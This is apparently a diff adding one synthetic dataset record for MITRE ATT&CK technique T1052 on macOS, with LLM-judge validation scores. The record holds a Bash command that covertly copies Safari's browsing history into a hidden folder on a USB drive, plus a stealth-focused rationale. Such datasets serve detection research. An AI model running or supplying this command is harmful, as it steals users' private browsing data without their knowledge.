@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "mkdir -p \"/Volumes/USB64/.browsing\" && cp -p \"$HOME/Library/Safari/History.db\" \"/Volumes/USB64/.browsing/.History.db\"",
+  "explanation": "Copies Safari browsing history database to a hidden location on the USB drive.",
+  "rationale_steps": [
+    "Target the Safari History.db as sensitive user activity data.",
+    "Use a mounted removable volume as the exfiltration path.",
+    "Preserve timestamps with cp -p for stealth.",
+    "Perform all actions locally without network transfer."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-06d48d2a-3f2754e6",
+  "source_prompt_hash": "06d48d2a",
+  "timestamp_utc": "2025-09-30T05:16:28.232349Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with valid mkdir and cp flags, proper && chaining, and balanced quoting around paths.",
+        "semantic_score": 5,
+        "semantic_justification": "Creates a hidden directory on a USB volume and copies Safari's History.db into it, achieving covert exfiltration to removable media on macOS without elevated privileges.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T07:48:56.216447Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags (-p for mkdir and cp), proper && chaining, and correct use of $HOME variable expansion.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1052 by creating a hidden directory (dot-prefixed) on a mounted USB volume and copying Safari's History.db with preserved metadata (-p flag), using dot-prefixed filenames for obfuscation — all consistent with staging data on physical media for exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-18T22:34:51.293930Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses standard Bash syntax with proper quoting, logical operators, and valid flags for mkdir and cp.",
+        "semantic_score": 5,
+        "semantic_justification": "The command correctly targets a known macOS browser history path and utilizes a standard removable media mount point with basic obfuscation (hidden files).",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-18T22:34:52.796151Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
